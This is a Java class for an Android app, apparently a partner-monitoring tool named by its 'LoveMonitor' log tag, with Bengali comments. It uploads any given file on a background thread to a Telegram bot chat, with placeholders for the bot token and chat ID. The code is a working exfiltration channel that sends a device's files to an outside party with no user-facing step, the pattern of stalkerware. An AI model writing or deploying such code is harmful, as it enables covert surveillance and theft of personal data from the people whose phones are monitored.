package com.love.myapp;

import android.util.Log;
import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class TelegramUploader {

    private static final String BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
    private static final String CHAT_ID = "YOUR_CHAT_ID_HERE";
    
    // থ্রেড ম্যানেজমেন্টের জন্য
    private static final ExecutorService executor = Executors.newSingleThreadExecutor();

    public static void uploadFile(final String filePath) {
        executor.execute(new Runnable() {
            @Override
            public void run() {
                File uploadFile = new File(filePath);
                if (!uploadFile.exists() || uploadFile.length() == 0) {
                    Log.d("LoveMonitor", "File not found or empty: " + filePath);
                    return;
                }

                String boundary = "===" + System.currentTimeMillis() + "===";
                String requestURL = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument?chat_id=" + CHAT_ID;

                HttpURLConnection httpConn = null;
                try {
                    URL url = new URL(requestURL);
                    httpConn = (HttpURLConnection) url.openConnection();
                    httpConn.setConnectTimeout(15000); // 15 সেকেন্ড টাইমআউট
                    httpConn.setReadTimeout(15000);
                    httpConn.setUseCaches(false);
                    httpConn.setDoOutput(true);
                    httpConn.setDoInput(true);
                    httpConn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

                    OutputStream outputStream = httpConn.getOutputStream();
                    PrintWriter writer = new PrintWriter(outputStream, true);

                    writer.append("--").append(boundary).append("\r\n");
                    writer.append("Content-Disposition: form-data; name=\"document\"; filename=\"").append(uploadFile.getName()).append("\"\r\n");
                    writer.append("Content-Type: application/octet-stream").append("\r\n\r\n").flush();

                    FileInputStream inputStream = new FileInputStream(uploadFile);
                    byte[] buffer = new byte[4096];
                    int bytesRead;
                    while ((bytesRead = inputStream.read(buffer)) != -1) {
                        outputStream.write(buffer, 0, bytesRead);
                    }
                    outputStream.flush();
                    inputStream.close();

                    writer.append("\r\n").flush();
                    writer.append("--").append(boundary).append("--\r\n").flush();
                    writer.close();

                    int status = httpConn.getResponseCode();
                    Log.d("LoveMonitor", "Upload Status: " + status);

                } catch (Exception e) {
                    Log.e("LoveMonitor", "Upload Error: " + e.getMessage());
                } finally {
                    if (httpConn != null) {
                        httpConn.disconnect();
                    }
                }
            }
        });
    }
}
